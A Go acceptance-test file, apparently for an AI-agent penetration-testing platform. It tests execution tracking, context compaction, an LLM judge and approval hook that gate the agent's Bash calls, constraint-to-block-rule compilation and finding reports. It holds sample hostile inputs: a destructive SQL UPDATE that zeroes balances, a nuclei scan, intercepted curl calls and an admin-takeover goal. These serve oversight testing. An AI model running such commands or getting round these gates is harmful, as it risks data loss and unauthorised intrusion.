		t.Fatalf("执行收束后意图应退回 open: %+v", node)
	}
	if !activitySeen(t, st, "execution_done") {
		t.Fatal("时间线缺少 execution_done")
	}
	row, err := e.m.pg.GetExecution(started.ID)
	if err != nil || row == nil || row.Status != db.ExecCompleted {
		t.Fatalf("执行终态落库: %+v err=%v", row, err)
	}

	// ⑥ 取消理由回传并落库。
	cres, err := runTool.Call(ctx, json.RawMessage(`{"command":"sleep 30","description":"验收：取消"}`), nil)
	if err != nil || !strings.Contains(cres.Flatten(), "execution started: ") {
		t.Fatalf("run_execution(取消用): %v %s", err, cres.Flatten())
	}
	var victim struct {
		ID int64 `json:"execution_id"`
	}
	if err := json.Unmarshal([]byte(execSnapshotJSON(t, cres.Flatten())), &victim); err != nil {
		t.Fatal(err)
	}
	kres, err := cancelTool.Call(ctx, json.RawMessage(`{"execution_id":`+itoa64(victim.ID)+`,"reason":"方向错误，改打别的接口"}`), nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(kres.Flatten(), "方向错误，改打别的接口") {
		t.Fatalf("取消理由必须回传模型: %s", kres.Flatten())
	}
	cancelDeadline := time.Now().Add(15 * time.Second)
	var crow *db.ToolExecution
	for time.Now().Before(cancelDeadline) {
		crow, _ = e.m.pg.GetExecution(victim.ID)
		if crow != nil && db.ExecutionTerminal(crow.Status) {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}
	if crow == nil || crow.Status != db.ExecCancelled || crow.CancelNote != "方向错误，改打别的接口" {
		t.Fatalf("取消必须落库并保真理由: %+v", crow)
	}

	// ⑦ 重启遗留行对账：orphaned（不是 failed）。
	left, err := e.m.pg.CreateExecution(&db.ToolExecution{TaskID: task.ID, Worker: "work#1", Tool: "run_execution", Command: "nuclei -u https://stale"})
	if err != nil {
		t.Fatal(err)
	}
	if err := e.m.pg.MarkExecutionRunning(left); err != nil {
		t.Fatal(err)
	}
	if n := svc.ReconcileOrphaned(); n < 1 {
		t.Fatalf("对账应至少标 1 条，实际 %d", n)
	}
	if got, _ := e.m.pg.GetExecution(left); got == nil || got.Status != db.ExecOrphaned {
		t.Fatalf("遗留行应为 orphaned（绝不为 failed）: %+v", got)
	}

	// ⑧ negative 证据门：零证据先拒，补一次真实执行后过。
	// 用一条【全新】意图：上面那条已经跑过执行，本来就该放行——证据门判的是"这个
	// 方向到底有没有真实探针证据"，不是"这个任务有没有跑过东西"。
	probeIntent, err := st.AddIntent(map[string]any{"summary": "没有探针证据的意图"}, 5, nil, "planner")
	if err != nil {
		t.Fatal(err)
	}
	if ok, err := st.ClaimIntent(probeIntent, "work#1", db.IntentLeaseTTL); err != nil || !ok {
		t.Fatalf("claim probe intent: ok=%v err=%v", ok, err)
	}
	ptx := agent.NewToolSet(st, "work#1")
	ptx.SetTaskID(tid)
	ptx.SetOwnerNode(probeIntent)
	ptx.SetExecService(svc)
	conclude := workflowTool(t, ptx.WorkerTools(), "conclude_intent")
	probeRun := workflowTool(t, ptx.WorkerTools(), "run_execution")
	zeroRes, err := conclude.Call(ctx, json.RawMessage(`{"outcome":"negative","note":"探针未发现"}`), nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(zeroRes.Flatten(), "不能声明 negative") {
		t.Fatalf("零证据的 negative 必须被拒: %s", zeroRes.Flatten())
	}
	if got, err := st.GetIntentSemanticOutcome(probeIntent); err != nil || got != "" {
		t.Fatalf("被拒的 negative 不得落库: %q err=%v", got, err)
	}
	// 补一次真实执行并等它收束 → 同一句 negative 通过。
	ev, err := probeRun.Call(ctx, json.RawMessage(`{"command":"true","description":"验收：探针证据"}`), nil)
	if err != nil || !strings.Contains(ev.Flatten(), "execution started: ") {
		t.Fatalf("run_execution(证据): %v %s", err, ev.Flatten())
	}
	var probe struct {
		ID int64 `json:"execution_id"`
	}
	if err := json.Unmarshal([]byte(execSnapshotJSON(t, ev.Flatten())), &probe); err != nil {
		t.Fatal(err)
	}
	probeDeadline := time.Now().Add(15 * time.Second)
	for time.Now().Before(probeDeadline) {
		st2, _ := svc.Get(ctx, probe.ID)
		if !agent.ExecActive(st2.Status) {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}
	okRes, err := conclude.Call(ctx, json.RawMessage(`{"outcome":"negative","note":"探针已发出且回包否定"}`), nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(okRes.Flatten(), "已记录意图") {
		t.Fatalf("有真实执行证据后 negative 应通过: %s", okRes.Flatten())
	}
	if got, err := st.GetIntentSemanticOutcome(probeIntent); err != nil || got != "negative" {
		t.Fatalf("通过后语义终态应落库: %q err=%v", got, err)
	}
}

// execSnapshotJSON pulls the snapshot object out of a run_execution tool result
// ("execution started: <id>\n<json>\n提示：…") and insists it carries an id.
func execSnapshotJSON(t *testing.T, text string) string {
	t.Helper()
	lines := strings.SplitN(text, "\n", 3)
	if len(lines) < 2 {
		t.Fatalf("执行工具返回里没有快照 JSON: %q", text)
	}
	return strings.TrimSpace(lines[1])
}

// activitySeen reports whether the task's timeline contains an activity of kind k.
func activitySeen(t *testing.T, st *db.ExplorationStore, kind string) bool {
	t.Helper()
	acts, _, err := st.ActivityList(nil, 0, 200)
	if err != nil {
		t.Fatalf("activity list: %v", err)
	}
	for _, a := range acts {
		if a.Kind == kind {
			return true
		}
	}
	return false
}

// accP14 走完 P14 的两半：常驻索引（目标原文 + 约束原文 + 活跃方向 + 发现一行式，
// 每个请求附一次、压缩吃不掉）与领域化摘要（7 段模板 + 被压原文落盘并把【绝对路径】
// 写进摘要请求）。用假 Provider 抓请求，不花真实 LLM 调用。
func accP14(t *testing.T, e *accEnv) {
	task, tid := e.newTask("acceptance-p14", "领域化压缩与常驻索引")
	st := task.Store
	ctx := context.Background()

	if _, err := st.AddGoal(map[string]any{"text": "拿 example.com 后台管理权限"}, "user"); err != nil {
		t.Fatal(err)
	}
	if _, err := st.AddConstraint("deny", "禁止对生产数据库做任何写操作", "user"); err != nil {
		t.Fatal(err)
	}
	intent, err := st.AddIntent(map[string]any{"summary": "枚举后台登录口的弱口令"}, 5, nil, "planner")
	if err != nil {
		t.Fatal(err)
	}
	if ok, err := st.ClaimIntent(intent, "work#1", db.IntentLeaseTTL); err != nil || !ok {
		t.Fatalf("claim: ok=%v err=%v", ok, err)
	}
	fid, _ := e.newFinding(task, tid, `{"vulnclass":"sqli","severity":"high","summary":"后台登录口 SQL 注入（已复现）","evidence":"sleep 5 生效","confidence":"high"}`)

	// 假 provider：抓住摘要请求，回一段合法摘要。
	var captured *llm.CompletionRequest
	prov := &retestProvider{complete: func(_ context.Context, req llm.CompletionRequest) (llm.Message, string, llm.Usage, error) {
		r := req
		captured = &r
		return llm.Message{Role: llm.RoleAssistant, Content: []llm.ContentBlock{llm.TextBlock("## 1. 授权范围与约束\n（无）")}}, "end_turn", llm.Usage{}, nil
	}}

	dumpDir := t.TempDir()
	opts := &agentcore.Options{Provider: prov, NonStreaming: true}
	agent.InstallContextManager(opts, 200000, dumpDir, func() string {
		return agent.BuildContextIndex(agent.ContextIndexVars{
			Store:  st,
			Intent: &db.Node{ID: intent, Payload: []byte(`{"summary":"枚举后台登录口的弱口令"}`)},
		})
	})
	if opts.Compactor == nil {
		t.Fatal("P14 上下文管理器未装上")
	}
	if opts.Compaction != nil {
		t.Fatal("Compactor 与 Compaction 必须互斥（Compaction 须被清空）")
	}
	// noa 已占槽位时不得被覆盖（互斥而非静默覆盖）。
	noaOwned := &agentcore.Options{Provider: prov, Compactor: opts.Compactor}
	agent.InstallContextManager(noaOwned, 200000, dumpDir, nil)
	if noaOwned.Compactor != harness.Compactor(opts.Compactor) {
		t.Fatal("已占用的 Compactor 槽位被静默覆盖")
	}

	view, ok := opts.Compactor.(harness.ContextView)
	if !ok {
		t.Fatal("DomainCompactor 必须实现 harness.ContextView（否则索引进不了请求）")
	}
	msgs := []llm.Message{llm.UserText("开始吧")}
	out := view.View(ctx, msgs)
	if len(out) != len(msgs)+1 {
		t.Fatalf("常驻索引必须每请求附一次：%d → %d", len(msgs), len(out))
	}
	if len(msgs) != 1 {
		t.Fatal("View 必须是纯投影：不得改动宿主历史")
	}
	idx := out[len(out)-1].Text()
	for _, want := range []string{
		"拿 example.com 后台管理权限",     // 目标原文
		"禁止对生产数据库做任何写操作",           // 约束原文
		"intent-" + itoa64(intent), // 活跃方向
		"后台登录口 SQL 注入（已复现）",        // 发现一行式
	} {
		if !strings.Contains(idx, want) {
			t.Fatalf("常驻索引缺少 %q:\n%s", want, idx)
		}
	}
	if fid <= 0 {
		t.Fatal("finding 未落库")
	}

	// 真压缩：喂一段超长历史 → 摘要请求必须带 7 段模板与原文落盘的绝对路径。
	// 标记句放最前面：SDK 会保留最近 N 条作为不摘要的尾巴，只有前面的才进落盘原文。
	big := []llm.Message{llm.UserText("这条用户原话必须出现在落盘原文里：只测 example.com，别碰别的")}
	for i := 0; i < 6; i++ {
		big = append(big,
			llm.UserText(strings.Repeat("A", 30000)),
			llm.Message{Role: llm.RoleAssistant, Content: []llm.ContentBlock{llm.TextBlock(strings.Repeat("B", 30000))}})
	}
	_ = opts.Compactor.Pre(ctx, big, 900000)
	if captured == nil {
		t.Fatal("超过阈值却没有发起摘要请求")
	}
	prompt := captured.Messages[len(captured.Messages)-1].Text()
	for _, section := range []string{
		"## 1. 授权范围与约束", "## 2. 资产与服务枚举", "## 3. 架构与薄弱点", "## 4. 已确认漏洞与攻击路径",
		"## 5. 工具核心发现", "## 6. 所有用户消息", "## 7. 进度·死路·下一步",
	} {
		e.mustContain(prompt, section, "领域压缩模板小节")
	}
	m := dumpPathRe.FindString(prompt)
	if m == "" || !filepath.IsAbs(m) {
		t.Fatalf("摘要请求必须给出原文落盘的绝对路径:\n%s", prompt)
	}
	body, err := os.ReadFile(m)
	if err != nil {
		t.Fatalf("落盘原文不可读: %v", err)
	}
	e.mustContain(string(body), "只测 example.com，别碰别的", "落盘原文里的用户原话")

	// 设置页可覆盖模板：DB 里有 compaction_prompt → override 生效。
	if err := e.m.pg.SetSetting(settingCompactionPrompt, "自定义压缩模板 {{.DumpPath}}"); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _, _ = e.m.pg.Exec(`DELETE FROM settings WHERE key=$1`, settingCompactionPrompt) })
	captured = nil
	_ = opts.Compactor.Pre(ctx, big, 900000)
	if captured == nil || !strings.Contains(captured.Messages[len(captured.Messages)-1].Text(), "自定义压缩模板") {
		t.Fatal("DB 覆盖的压缩模板未生效")
	}
}

// dumpPathRe 从摘要请求文本里抓原文落盘的绝对路径。
var dumpPathRe = regexp.MustCompile(`/[^\s。，、）()]+?\.txt`)

// accP15 走完 P15 的两条链：①结构化裁决——模型只给各轴把握与建议，allow/ask/deny 由
// 代码阈值算出（0.9 破坏分压过模型 approve；低破坏 + 渗透动作压过模型 deny；畸形输出
// 落到失败策略 ask；默认失败动作与默认结构化开关防回归）；②改参放行——审批人可以改参，
// 但只许收窄：越界 400，合法收窄真的替换进工具调用并留 narrow_diff 审计。顺带验交付
// 证据门（无绑定流量的发现导出 warnings 非空）。
func accP15(t *testing.T, e *accEnv) {
	task, tid := e.newTask("acceptance-p15", "结构化裁决与改参放行")
	ctx := intercept.WithTaskContext(context.Background(), task.ID, "acceptance", nil)
	ic := e.s.m.interceptor

	// —— ① 结构化裁决：假裁判按脚本回结构化 JSON，动作由代码阈值定 ——
	oldEnabled, hadEnabled, _ := e.m.pg.GetSetting("llm_judge_enabled")
	oldStructured, hadStructured, _ := e.m.pg.GetSetting("llm_judge_structured")
	oldFail, hadFail, _ := e.m.pg.GetSetting("llm_judge_fail_action")
	t.Cleanup(func() {
		restore := func(key, val string, had bool) {
			if had {
				_ = e.m.pg.SetSetting(key, val)
			} else {
				_, _ = e.m.pg.Exec(`DELETE FROM settings WHERE key=$1`, key)
			}
		}
		restore("llm_judge_enabled", oldEnabled, hadEnabled)
		restore("llm_judge_structured", oldStructured, hadStructured)
		restore("llm_judge_fail_action", oldFail, hadFail)
	})
	for k, v := range map[string]string{"llm_judge_enabled": "true", "llm_judge_structured": "true"} {
		if err := e.m.pg.SetSetting(k, v); err != nil {
			t.Fatal(err)
		}
	}
	// 默认失败动作必须是 ask（防回归：放宽方向的默认值会让故障变成静默放行）。
	// 复用库里可能残留旧默认值 allow —— 先清掉这一行，测的是"没有配置时的默认"。
	if _, err := e.m.pg.Exec(`DELETE FROM settings WHERE key='llm_judge_fail_action'`); err != nil {
		t.Fatal(err)
	}
	cfg := ic.GetJudgeConfig()
	if cfg.FailAction != "ask" {
		t.Fatalf("裁判失败默认动作 = %q，want ask", cfg.FailAction)
	}
	if !cfg.Structured {
		t.Fatal("结构化裁决必须默认开启")
	}

	reply := ""
	ic.SetReviewer(func(context.Context, int64, string, intercept.ReviewInput) (intercept.Decision, error) {
		// 关键：Reviewer 只回【原始文本】，动作由 intercept.Judge 按代码阈值算。
		return intercept.Decision{RawReply: reply}, nil
	})
	judge := func(raw string, in string) intercept.Decision {
		reply = raw
		dec, ok := ic.Judge(ctx, "Bash", json.RawMessage(in))
		if !ok {
			t.Fatalf("裁判未产出裁决（raw=%s）", raw)
		}
		return dec
	}
	call := `{"command":"mysql -e \"UPDATE accounts SET balance=0\""}`

	// 破坏性轴 0.9 + 模型建议 allow → 代码仍然 deny。
	dec := judge(`{"nouls":{"irreversible_data_loss":0.9,"authorized_pentest_payload":0.2},"choice":"allow","choice_conf":0.99,"comment":"改余额"}`, call)
	if dec.Action != "deny" || !strings.Contains(dec.Message, "不可逆数据破坏") {
		t.Fatalf("破坏轴 0.9 必须 deny: %+v", dec)
	}
	if dec.ModelVerdict == "" {
		t.Fatal("结构化裁决必须进 audit（ModelVerdict 为空）")
	}

	// 全轴 <0.35 + 渗透轴 0.8 + 模型 reject 0.9 → 代码 allow（明显的渗透动作不该被模型砍掉）。
	dec = judge(`{"nouls":{"destroys_availability":0.1,"irreversible_data_loss":0.2,"credential_or_acl_change":0.1,"config_tamper":0.1,"authorized_pentest_payload":0.8},"choice":"deny","choice_conf":0.9,"comment":"注入探测"}`, call)
	if dec.Action != "allow" {
		t.Fatalf("低破坏 + 渗透动作必须 allow: %+v", dec)
	}

	// 空/畸形 verdict → 失败策略 = ask。
	for _, bad := range []string{"", "我看还是放行吧", `{"nouls":{"whatever":0.9},"choice":"allow","choice_conf":0.9}`, `{"nouls":{},"choice":"allow"}`} {
		dec = judge(bad, call)
		if dec.Action != "ask" || !dec.ModelFallback {
			t.Fatalf("畸形裁决必须按失败策略转人工: raw=%q dec=%+v", bad, dec)
		}
	}

	// —— ② 改参放行：只许收窄，且真的替换进工具调用 ——
	if _, err := e.m.pg.CreateInterceptRule("acc-p15-ask-curl", "tool_input", "string", "curl", "ask", "", 100, true, false, 0, "deny"); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _, _ = e.m.pg.Exec(`DELETE FROM intercept_rules WHERE name=$1`, "acc-p15-ask-curl") })
	ic.Invalidate()
	original := `{"command":"curl -X POST http://acc-p15.example/api/import -d @big.txt --max-time 600"}`
	// 合法收窄示例：从原命令里删掉 -X POST / -d @big.txt / --max-time 600（保序删字符）。
	narrowed := `{"command":"curl http://acc-p15.example/api/import"}`

	g := guard.NewWithInterceptor(ic, tid)
	type hookOut struct {
		blocked bool
		reason  string
		updated []byte
	}
	done := make(chan hookOut, 1)
	go func() {
		blocked, reason, updated := g.Hooks().PreToolUse(ctx, "Bash", []byte(original))
		done <- hookOut{blocked, reason, updated}
	}()

	// 等 pending 行出现。
	pendingID := int64(0)
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) && pendingID == 0 {
		_ = e.m.pg.QueryRow(`SELECT COALESCE(MAX(id),0) FROM intercept_pending WHERE task_id=$1 AND status='pending'`, task.ID).Scan(&pendingID)
		if pendingID == 0 {
			time.Sleep(100 * time.Millisecond)
		}
	}
	if pendingID == 0 {
		t.Fatal("ask 规则没有生成待审批记录")
	}
	idStr := strconv.FormatInt(pendingID, 10)

	// 越界改参（新增键 / 加长命令）→ 400，且审批仍然待定。
	for _, bad := range []string{
		`{"decision":"allowed","edited_input":{"command":"curl http://acc-p15.example/api/import","extra":"x"}}`,
		`{"decision":"allowed","edited_input":{"command":"curl -X POST http://acc-p15.example/api/import -d @big.txt --max-time 600 --retry 9"}}`,
	} {
		rec := e.request(http.MethodPost, "/api/intercept/pending/"+idStr+"/decide", bad)
		if rec.Code != 400 || !strings.Contains(rec.Body.String(), "收窄") {
			t.Fatalf("越界改参必须 400 且说明只许收窄: code=%d body=%s", rec.Code, rec.Body.String())
		}
	}

	// 合法收窄 → 200，钩子返回的就是改后的参数。
	rec := e.request(http.MethodPost, "/api/intercept/pending/"+idStr+"/decide",
		`{"decision":"allowed","edited_input":`+narrowed+`}`)
	if rec.Code != 200 {
		t.Fatalf("合法收窄放行失败: code=%d body=%s", rec.Code, rec.Body.String())
	}
	select {
	case out := <-done:
		if out.blocked {
			t.Fatalf("合法收窄后不应拦截: %s", out.reason)
		}
		var got, want map[string]any
		if err := json.Unmarshal(out.updated, &got); err != nil {
			t.Fatalf("钩子未返回改后参数（updated=%q）: %v", out.updated, err)
		}
		_ = json.Unmarshal([]byte(narrowed), &want)
		if got["command"] != want["command"] {
			t.Fatalf("执行参数不是改后的收窄版: got=%v want=%v", got, want)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("审批已决定但钩子没有返回")
	}
	// audit 里能回答"到底放行了哪份参数"。
	var audit string
	if err := e.m.pg.QueryRow(`SELECT COALESCE(audit::text,'') FROM intercept_pending WHERE id=$1`, pendingID).Scan(&audit); err != nil {
		t.Fatal(err)
	}
	var parsed struct {
		EffectiveAction string   `json:"effective_action"`
		NarrowDiff      []string `json:"narrow_diff"`
		EditedInput     struct {
			Command string `json:"command"`
		} `json:"edited_input"`
	}
	if err := json.Unmarshal([]byte(audit), &parsed); err != nil {
		t.Fatalf("审计不是 JSON: %v (%s)", err, audit)
	}
	if parsed.EffectiveAction != "allow" || len(parsed.NarrowDiff) == 0 || parsed.EditedInput.Command != "curl http://acc-p15.example/api/import" {
		t.Fatalf("audit 未记录收窄结果: %+v", parsed)
	}

	// —— ③ 交付证据门：无绑定流量的发现，warnings 非空 ——
	fid, _ := e.newFinding(task, tid, `{"vulnclass":"xss","severity":"medium","summary":"证据门验收","evidence":"未绑定流量","confidence":"low"}`)
	rec = e.request(http.MethodGet, "/api/findings/"+strconv.FormatInt(fid, 10)+"/src-report/check", "")
	if rec.Code != 200 {
		t.Fatalf("证据门接口 status=%d body=%s", rec.Code, rec.Body.String())
	}
	var gate struct {
		Ready    bool     `json:"ready"`
		Warnings []string `json:"warnings"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &gate); err != nil {
		t.Fatal(err)
	}
	if gate.Ready || len(gate.Warnings) == 0 {
		t.Fatalf("无证据发现必须给出 warnings: %+v", gate)
	}
	mdRec := e.request(http.MethodGet, "/api/findings/"+strconv.FormatInt(fid, 10)+"/src-report", "")
	if mdRec.Code != http.StatusOK {
		t.Fatalf("src-report status=%d body=%s", mdRec.Code, mdRec.Body.String())
	}
	e.mustContain(mdRec.Body.String(), "⚠", "简报备注区的证据门警告")
}

// accP18 走完「约束 → 可执行」这条链：deny 约束确定性编译成任务级拦截规则（只抽目标
// 与已知工具名，不做意图推断），预览拿本任务真实发生过的调用当样本；应用后在本任务里
// **确定性拦截**、在别的任务里不生效；allow 约束编译进授权范围；抽不出东西的约束如实
// 说明；改约束会撤掉已生效规则（不静默改语义）；删约束连带删规则。
func accP18(t *testing.T, e *accEnv) {
	task, tid := e.newTask("acceptance-p18", "约束可执行化")
	other, otherTid := e.newTask("acceptance-p18-other", "另一个任务（任务级规则不该外溢）")
	// 环境变量优先于 setting；本用例要验的是规则层，先把 RoE 关掉保证确定性。
	t.Setenv("ARTEX_SCOPE_ENFORCEMENT", "")
	oldMode, hadMode, _ := e.m.pg.GetSetting("intercept_scope_mode")
	t.Cleanup(func() {
		if hadMode {
			_ = e.m.pg.SetSetting("intercept_scope_mode", oldMode)
		} else {
			_, _ = e.m.pg.Exec(`DELETE FROM settings WHERE key=$1`, "intercept_scope_mode")
		}
		_, _ = e.m.pg.Exec(`DELETE FROM intercept_rules WHERE COALESCE(task_id,'') <> ''`)
		e.s.m.interceptor.Invalidate()
	})
	if err := e.m.pg.SetSetting("intercept_scope_mode", "off"); err != nil {
		t.Fatal(err)
	}
	ctx := intercept.WithTaskContext(context.Background(), task.ID, "acceptance", nil)
	otherCtx := intercept.WithTaskContext(context.Background(), other.ID, "acceptance", nil)

	// ① 新增一条带目标的 deny 约束，编译 → 确定性抽到目标，生成 1 条规则。
	rec := e.request(http.MethodPost, "/api/tasks/"+task.ID+"/constraints",
		`{"kind":"deny","text":"禁止访问 admin.example.com 这个管理后台"}`)
	if rec.Code != 200 {
		t.Fatalf("新增约束 status=%d body=%s", rec.Code, rec.Body.String())
	}
	var created ConstraintDTO
	if err := json.Unmarshal(rec.Body.Bytes(), &created); err != nil {
		t.Fatal(err)
	}
	// cid1 全程指第一条（deny）约束：后面还会新建别的约束，别把 id 变量串了。
	cid1 := created.ID
	base := "/api/tasks/" + task.ID + "/constraints/" + cid1
	rec = e.request(http.MethodPost, base+"/compile", "")
	if rec.Code != 200 {
		t.Fatalf("compile status=%d body=%s", rec.Code, rec.Body.String())
	}
	var draft struct {
		Note  string `json:"note"`
		Rules []struct {
			Pattern     string `json:"pattern"`
			MatchTarget string `json:"match_target"`
			Action      string `json:"action"`
		} `json:"rules"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &draft); err != nil {
		t.Fatal(err)
	}
	if len(draft.Rules) != 1 || draft.Rules[0].Pattern != "admin.example.com" || draft.Rules[0].Action != "deny" {
		t.Fatalf("确定性编译结果不对: %+v（note=%s）", draft.Rules, draft.Note)
	}

	// ② 先造一条"本任务真实发生过"的调用记录（预览的样本来源是活动日志里的 tool_use），
	// 再编译 → 预览命中 1 条。
	g := guard.NewWithInterceptor(e.s.m.interceptor, tid)
	if _, err := task.Store.AppendActivity(db.Activity{Kind: "tool_use", Tool: "Bash",
		Summary: "Bash curl http://admin.example.com/login",
		Detail:  `{"command":"curl http://admin.example.com/login"}`}); err != nil {
		t.Fatal(err)
	}
	rec = e.request(http.MethodPost, base+"/compile", "")
	if rec.Code != 200 {
		t.Fatalf("compile(二) status=%d", rec.Code)
	}
	var withPreview struct {
		Preview []struct {
			Pattern string `json:"pattern"`
			Matched int    `json:"matched"`
			Total   int    `json:"total"`
		} `json:"preview"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &withPreview); err != nil {
		t.Fatal(err)
	}
	if len(withPreview.Preview) != 1 || withPreview.Preview[0].Matched != 1 || withPreview.Preview[0].Total < 1 {
		t.Fatalf("预览没有用真实调用当样本: %+v", withPreview.Preview)
	}

	// ③ 应用 → 落成本任务的任务级规则；本任务里确定性拦截，别的任务不受影响。
	rec = e.request(http.MethodPost, base+"/apply", "")
	if rec.Code != 200 {
		t.Fatalf("apply status=%d body=%s", rec.Code, rec.Body.String())
	}
	blocked, reason, _ := g.Hooks().PreToolUse(ctx, "Bash", []byte(`{"command":"curl http://admin.example.com/login"}`))
	if !blocked || !strings.Contains(reason, "任务操作约束") {
		t.Fatalf("约束没有变成确定性拦截: blocked=%v reason=%q", blocked, reason)
	}
	og := guard.NewWithInterceptor(e.s.m.interceptor, otherTid)
	blockedOther, _, _ := og.Hooks().PreToolUse(otherCtx, "Bash", []byte(`{"command":"curl http://admin.example.com/login"}`))
	if blockedOther {
		t.Fatal("任务级规则外溢到了别的任务")
	}
	// 列表里这条约束应显示"已生效 1 条"。
	rec = e.request(http.MethodGet, "/api/tasks/"+task.ID+"/constraints", "")
	var listed struct {
		Constraints []ConstraintDTO `json:"constraints"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &listed); err != nil {
		t.Fatal(err)
	}
	found := false
	for _, c := range listed.Constraints {
		if c.ID == cid1 {
			found = c.CompiledRules == 1
		}
	}
	if !found {
		t.Fatalf("约束列表没有显示已生效规则数: %+v", listed.Constraints)
	}

	// ④ allow 约束 → 编译进授权范围（RoE 允许面），不生成拦截规则。
	rec = e.request(http.MethodPost, "/api/tasks/"+task.ID+"/constraints",
		`{"kind":"allow","text":"允许范围包含 api.example.com"}`)
	var allowConstraint ConstraintDTO
	if err := json.Unmarshal(rec.Body.Bytes(), &allowConstraint); err != nil {
		t.Fatal(err)
	}
	rec = e.request(http.MethodPost, "/api/tasks/"+task.ID+"/constraints/"+allowConstraint.ID+"/apply", "")
	if rec.Code != 200 {
		t.Fatalf("allow apply status=%d body=%s", rec.Code, rec.Body.String())
	}
	var allowResp struct {
		Note   string `json:"note"`
		Scopes []struct {
			Kind   string `json:"kind"`
			Domain string `json:"domain"`
		} `json:"scopes"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &allowResp); err != nil {
		t.Fatalf("%v (body=%s)", err, rec.Body.String())
	}
	// root_domain 归一化：允许 api.example.com → 授权范围记 example.com（与范围面板同一口径）。
	if len(allowResp.Scopes) != 1 || allowResp.Scopes[0].Kind != "root_domain" || allowResp.Scopes[0].Domain != "example.com" {
		t.Fatalf("allow 约束没有进授权范围: scopes=%+v body=%s", allowResp.Scopes, rec.Body.String())
	}
	if rows, err := e.m.Assets().ListTaskScope(tid); err != nil || len(rows) == 0 {
		t.Fatalf("授权范围里没有这条: %v %d", err, len(rows))
	}

	// ⑤ 抽不出目标的约束：如实说明，不硬造规则。
	rec = e.request(http.MethodPost, "/api/tasks/"+task.ID+"/constraints",
		`{"kind":"deny","text":"禁止对生产数据库做任何写操作"}`)
	var vagueConstraint ConstraintDTO
	if err := json.Unmarshal(rec.Body.Bytes(), &vagueConstraint); err != nil {
		t.Fatal(err)
	}
	rec = e.request(http.MethodPost, "/api/tasks/"+task.ID+"/constraints/"+vagueConstraint.ID+"/compile", "")
	if err := json.Unmarshal(rec.Body.Bytes(), &draft); err != nil {
		t.Fatal(err)
	}
	if len(draft.Rules) != 0 || !strings.Contains(draft.Note, "无法确定性编译") {
		t.Fatalf("抽不出目标时应如实说明而不是硬造规则: rules=%d note=%s", len(draft.Rules), draft.Note)
	}

	// ⑥ 改约束 → 已生效规则被撤（不静默保留旧语义）。
	rec = e.request(http.MethodPatch, base, `{"kind":"deny","text":"禁止访问 admin2.example.com"}`)
	if rec.Code != 200 {
		t.Fatalf("edit status=%d body=%s", rec.Code, rec.Body.String())
	}
	if n, _ := e.m.pg.CountRulesByConstraint(task.ID); n[parseInt64(t, cid1)] != 0 {
		t.Fatalf("改约束后旧规则没撤: %+v", n)
	}
	if blocked, _, _ := g.Hooks().PreToolUse(ctx, "Bash", []byte(`{"command":"curl http://admin.example.com/login"}`)); blocked {
		t.Fatal("改约束后旧规则仍在拦（语义已变却继续生效）")
	}

	// ⑦ 删约束 → 规则一并删除，不留孤儿。
	rec = e.request(http.MethodPost, base+"/apply", "")
	if rec.Code != 200 {
		t.Fatalf("re-apply status=%d", rec.Code)
	}
	if n, _ := e.m.pg.CountRulesByConstraint(task.ID); n[parseInt64(t, cid1)] == 0 {
		t.Fatal("重新应用后应有规则")
	}
	rec = e.request(http.MethodDelete, base, "")
	if rec.Code != 200 {
		t.Fatalf("delete status=%d body=%s", rec.Code, rec.Body.String())
	}
	if n, _ := e.m.pg.CountRulesByConstraint(task.ID); n[parseInt64(t, cid1)] != 0 {
		t.Fatalf("删约束后规则成了孤儿: %+v", n)
	}
}

// parseInt64 解析 DTO 里的字符串 id。
func parseInt64(t *testing.T, s string) int64 {
	t.Helper()
	n, err := strconv.ParseInt(s, 10, 64)
	if err != nil {
		t.Fatalf("bad id %q: %v", s, err)
	}
	return n
}

// accP19 走完批量交付：一个任务的全部发现打成一份交付包——提交说明（清单 + 证据门 +
// 疑似重复分组）+ 每条发现的规范简报与 docx；同源（同漏洞类型 + 同端点集合）的发现
// 被归成一组提示合并提交；已撤回的不进包但在说明里交代清楚。
func accP19(t *testing.T, e *accEnv) {
	task, tid := e.newTask("acceptance-p19", "批量交付")
	// A/B 是同一个洞的两次登记（同类型、同端点、payload 不同）→ 应归为一组；
	// C 是同一端点上的另一种洞 → 不归组；D 已撤回 → 不进包。
	fA, _ := e.newFinding(task, tid, `{"vulnclass":"sqli","name":"用户接口注入（第一份）","severity":"high","summary":"用户接口注入（第一份）","evidence":"id=1 触发","confidence":"high"}`)
	fB, _ := e.newFinding(task, tid, `{"vulnclass":"sqli","name":"用户接口注入（重复登记）","severity":"high","summary":"用户接口注入（重复登记）","evidence":"id=2 触发","confidence":"high"}`)
	fC, _ := e.newFinding(task, tid, `{"vulnclass":"xss","severity":"medium","summary":"同一端点的反射型 XSS","evidence":"q= 回显","confidence":"medium"}`)
	fD, _ := e.newFinding(task, tid, `{"vulnclass":"ssrf","severity":"low","summary":"后来被推翻的那条","evidence":"复测推翻","confidence":"low"}`)

	bind := func(fid int64, url, role string) {
		sn := db.TrafficEvidenceSnapshot{
			SourceTrafficID: "acc-p19-" + strconv.FormatInt(fid, 10),
			URL:             url, Method: "GET", Status: 200, ContentType: "application/json",
			ReqHead:  "GET " + url + " HTTP/1.1\nHost: app.example.com",
			RespHead: "HTTP/1.1 200 OK",
		}
		sn = sn.Normalize()
		sn.ID = db.TrafficSnapshotID(sn)
		if err := e.m.pg.WithEvidenceTx(context.Background(), func(tx *sql.Tx) error {
			return db.AddFindingTrafficTx(tx, fid, []db.PreparedTrafficEvidence{{
				Ref: db.TrafficRef{Role: role, Note: "验收"}, Snapshot: sn,
			}})
		}); err != nil {
			t.Fatalf("bind traffic: %v", err)
		}
	}
	bind(fA, "https://app.example.com/api/user?id=1", "proof")
	bind(fB, "https://app.example.com/api/user?id=99", "proof") // 同端点、不同 payload
